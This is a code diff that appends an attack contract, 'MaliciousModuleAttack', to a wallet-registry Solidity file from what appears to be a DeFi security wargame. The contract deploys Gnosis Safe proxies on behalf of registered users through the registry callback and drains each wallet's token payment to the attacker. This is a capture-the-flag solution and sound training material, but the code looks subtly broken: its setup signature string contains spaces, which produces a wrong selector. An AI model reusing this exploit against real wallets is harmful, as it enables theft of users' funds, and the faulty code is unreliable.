@@ -4,7 +4,9 @@ pragma solidity ^0.8.0;
 import "@openzeppelin/contracts/access/Ownable.sol";
 import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
 import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
+import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
 import "@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol";
+import "../DamnValuableToken.sol";
 
 /**
  * @title WalletRegistry
@@ -94,4 +96,44 @@ contract WalletRegistry is IProxyCreationCallback, Ownable {
         // Pay tokens to the newly created wallet
         token.transfer(walletAddress, TOKEN_PAYMENT);        
     }
+}
+
+
+contract MaliciousModuleAttack {
+
+	address public owner;
+	address public factory;
+	address public masterCopy;
+	address public walletRegistry;
+	address public token;
+
+	constructor(address _ownerAddr, address _factoryAddr, address _masterCopyAddr, address _walletRegistryAddr, address _tokenAddr){
+		owner = _ownerAddr;
+		factory = _factoryAddr;
+		masterCopy = _masterCopyAddr;
+		walletRegistry = _walletRegistryAddr;
+		token = _tokenAddr;
+	}	
+	
+	function setupToken(address _tokenAddr, address _attackerAddr) external {
+
+		DamnValuableToken(_tokenAddr).approve(_attackerAddr, 10 ether);
+	}
+
+	function attack(address[] memory users, bytes memory setupData) external {
+	    for(uint256 i=0;i< users.length; i++){
+ 		address user = users[i];
+		address[] memory victim = new address[](1);
+		victim[0] = user;
+		string memory signatureString = "setup(address[], uint256, address, bytes, address, address, uint256, address)";
+		bytes memory initGnosis = abi.encodeWithSignature(
+			signatureString, victim, uint256(1), address(this), setupData, address(0), address(0), address(0), address(0) );
+		GnosisSafeProxy newProxy = GnosisSafeProxyFactory(factory).createProxyWithCallback(masterCopy, initGnosis, 123,
+			IProxyCreationCallback(walletRegistry)
+		);
+		DamnValuableToken(token).transferFrom(address(newProxy),owner, 10 ether);
+	    }
+	
+	}
+
 }
